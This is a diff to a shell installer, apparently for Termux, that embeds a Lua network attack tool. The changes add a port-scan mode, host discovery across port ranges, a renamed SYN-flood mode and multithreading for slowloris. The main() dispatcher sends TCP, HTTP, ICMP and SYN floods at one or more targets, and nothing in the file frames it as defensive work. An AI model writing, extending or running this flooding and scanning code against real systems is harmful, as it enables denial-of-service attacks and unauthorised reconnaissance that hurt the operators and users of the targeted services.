@@ -101805,7 +102695,7 @@ local function main()
         elseif a=="--tcp"  or a=="--tcp-cosmo"  then mode="tcp"
         elseif a=="--http" or a=="--http-cosmo" then mode="http"
         elseif a=="--icmp" or a=="--icmp-cosmo" then mode="icmp"
-        elseif a=="--psyn" or a=="--gsyn-cosmo" then mode="psyn"
+        elseif a=="--psyn" or a=="--gsyn-cosmo" then mode="syn" -- alias legado
         elseif a=="--slow" or a=="--slowloris"  then mode="slow"
         elseif a=="--tfp"                        then mode="tfp"
         elseif a=="--os"   or a=="-osc"          then mode="os"
@@ -101813,6 +102703,8 @@ local function main()
         elseif a=="--dns"                        then mode="dns"
         elseif a=="--ping"                       then mode="ping"
         elseif a=="--hosts" or a=="--ip"         then mode="hosts"
+        elseif a=="--scan"                        then mode="scan"
+        elseif a=="--syn"                         then mode="syn"
         elseif a=="--quiet"                      then quiet=true
         elseif a=="-v" or a=="--verbose"         then verbose=true
         elseif a=="-ua" or a=="--rand-ua"        then rand_ua=true
@@ -101835,6 +102727,8 @@ local function main()
         elseif a=="-st" then i=i+1; sleep_sec=tonumber(arg[i]); if not sleep_sec or sleep_sec<1 then io.stderr:write(RED.."Erro: -st requer numero >= 1.\n"..RST);os.exit(1) end
         elseif a:match("^%-t%d+$") then threads=tonumber(a:sub(3))
         elseif a:match("^%-s%d+$") then packets=tonumber(a:sub(3))
+        elseif a:match("^%-p.+")   then ports_str=a:sub(3)
+        elseif a:match("^%-st%d")  then sleep_sec=tonumber(a:match("^%-st(%d+)")); if not sleep_sec or sleep_sec<1 then io.stderr:write(RED.."Erro: -st requer numero >= 1.\n"..RST);os.exit(1) end
         elseif not a:match("^%-") then targets[#targets+1]=a  -- coleta TODOS os targets
         end
         i=i+1
@@ -101851,13 +102745,32 @@ local function main()
     local ports  = parse_ports(ports_str)
 
     -- ── modos single-target ────────────────────────────────────────────────
-    if mode=="slow" then slow_cosmo(target,ports[1],packets,sleep_sec,rand_ua,verbose); return end
+    if mode=="slow" then slow_cosmo(target,ports[1],packets,sleep_sec,rand_ua,verbose,threads); return end
 
     if mode=="hosts" then
         print(BLU..BOLD.."Descobrindo hosts na rede local..."..RST)
         if type(net)=="table" and type(net.ip)=="function" then
-            local ok,_ = pcall(net.ip, target)
-            if not ok then print(RED.."net.ip() falhou"..RST) end
+            local ok, err
+            local f, t = ports_str:match("^(%d+)-(%d+)$")
+            if f and t then
+                -- range contínuo: -p 80-443 → discovery + scan de 80 a 443 em uma chamada
+                ok, err = pcall(net.ip, nil, tonumber(f), tonumber(t))
+            elseif #ports > 1 then
+                -- lista: -p 80,443 → usa min e max como range do scan
+                local pmin, pmax = ports[1], ports[1]
+                for _, p in ipairs(ports) do
+                    if p < pmin then pmin = p end
+                    if p > pmax then pmax = p end
+                end
+                ok, err = pcall(net.ip, nil, pmin, pmax)
+            elseif #ports == 1 then
+                -- porta única: -p 80 → discovery + scan só nessa porta
+                ok, err = pcall(net.ip, nil, ports[1], ports[1])
+            else
+                -- sem -p: só discovery (comportamento original)
+                ok, err = pcall(net.ip, target)
+            end
+            if not ok then print(RED.."net.ip() falhou: "..(tostring(err) or "")..RST) end
         else
             print(RED.."net.ip nao disponivel neste build"..RST)
         end
@@ -101905,6 +102818,26 @@ local function main()
         elseif mode=="recon" then
             full_recon(tgt, ports, quiet)
 
+        elseif mode=="scan" then
+            -- -p 1-9999   → range contínuo (uma chamada)
+            -- -p 80,443   → lista: escaneia cada porta individualmente
+            -- -p 80       → porta única
+            -- sem -p      → padrão 1-1024
+            local f, t = ports_str:match("^(%d+)-(%d+)$")
+            if f and t then
+                -- range explícito: ex. -p 1-9999
+                net.scan(tgt, tonumber(f), tonumber(t))
+            elseif #ports > 1 then
+                -- lista: -p 80,443 → net.scan por porta individual
+                for _, p in ipairs(ports) do
+                    net.scan(tgt, p, p)
+                end
+            elseif #ports == 1 then
+                net.scan(tgt, ports[1], ports[1])
+            else
+                net.scan(tgt, 1, 1024)
+            end
+
         else
             -- modos de flood com multiplos targets
             if not quiet then
@@ -101919,7 +102852,7 @@ local function main()
                 elseif mode=="tcp"  then tcp_flood (tgt,port,packets,threads,pkt_size)
                 elseif mode=="http" then http_flood(tgt,port,packets,threads,pkt_size)
                 elseif mode=="icmp" then icmp_flood(tgt,packets,threads,pkt_size)
-                elseif mode=="psyn" then psyn_flood(tgt,port,packets,threads,pkt_size)
+                elseif mode=="syn"  then syn_flood(tgt,port,packets,threads)
                 end
             end
             print(string.format("\n%s%s[COSMO]%s %s finalizado em %.2fs",
@@ -101930,13 +102863,13 @@ local function main()
     if #targets > 1 then
         print(YEL..BOLD.."\n[COSMO FINALIZADO] "..#targets.." targets processados."..RST)
     end
-    print(YEL..BOLD.."No COSMIC"..RST)
+    print(YEL..BOLD.."No NEXUS"..RST)
 end
 
 main()
-COSMICEOF
-    chmod 755 "$_EX_DIR/cosmic.lua"
-    _ok "cosmic.lua instalado"
+NEXUSEOF
+    chmod 755 "$_EX_DIR/nexus.lua"
+    _ok "nexus.lua instalado"
 
     # ── C Scripts — slot reservado para script do usuario ──────────────
     _C_DIR="${PREFIX:-/data/data/com.termux/files/usr}/share/c-scripts"
